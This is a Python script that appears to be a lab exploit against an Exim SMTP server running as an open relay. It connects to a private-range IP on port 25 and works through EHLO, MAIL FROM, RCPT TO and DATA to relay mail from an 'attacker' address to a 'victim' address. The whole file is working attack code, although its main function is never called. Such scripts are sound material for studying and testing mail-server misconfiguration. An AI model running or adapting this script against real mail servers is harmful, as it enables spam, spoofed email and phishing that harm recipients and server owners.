import socket
import sys
import time

# Configuration
target_ip = '192.168.56.103'  # Exim Server IP
target_port = 25  # SMTP Port (default for Exim)
from_email = 'a@a.com'  # Attacker email
to_email = 'b@b.com'  # Victim email
subject = 'Test Subject'
body = 'This is a test email.'

def connect_to_smtp_server(target_ip, target_port):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.settimeout(10)  # Set a timeout for the connection
        server.connect((target_ip, target_port))
        print(f"Connected to {target_ip}:{target_port}")
        
        # Wait for initial greeting (e.g., 220 message)
        greeting = server.recv(4096).decode()
        print(f"Initial server greeting: {greeting.strip()}")
        
        return server
    except Exception as e:
        print(f"Error connecting to SMTP server: {e}")
        sys.exit(1)

# Send an SMTP command and handle server response
def send_command(server, command, expected_code=None):
    print(f"Sending command: {command.strip()}")
    server.sendall((command + "\r\n").encode())  # Add CRLF to each command

    try:
        response = server.recv(4096).decode()
        print(f"Received: {response.strip()}")

        # Check if we expect a specific code (e.g., 250 for OK)
        if expected_code and not response.startswith(expected_code):
            print(f"Error: Unexpected response: {response}")
            sys.exit(1)
        return response
    except socket.timeout:
        print("Error: No response from server, timed out.")
        sys.exit(1)
    except socket.error as e:
        print(f"Error receiving data: {e}")
        sys.exit(1)

# Exploit open relay to send email
def exploit_open_relay():
    # Connect to SMTP server
    server = connect_to_smtp_server(target_ip, target_port)

    # Receive and acknowledge server greeting
    time.sleep(2)  # Adjusted delay
    send_command(server, "EHLO localhost", expected_code="250")
    time.sleep(2)
    send_command(server, f"MAIL FROM:<{from_email}>", expected_code="250")
    time.sleep(2)
    send_command(server, f"RCPT TO:<{to_email}>", expected_code="250")
    time.sleep(2)
    send_command(server, "DATA", expected_code="354")
    time.sleep(2)

    # Send the email headers and body
    email_data = f"Subject: {subject}\r\n\r\n{body}\r\n."
    send_command(server, email_data, expected_code="250")
    time.sleep(2)
    
    send_command(server, "QUIT", expected_code="221")
    time.sleep(2)
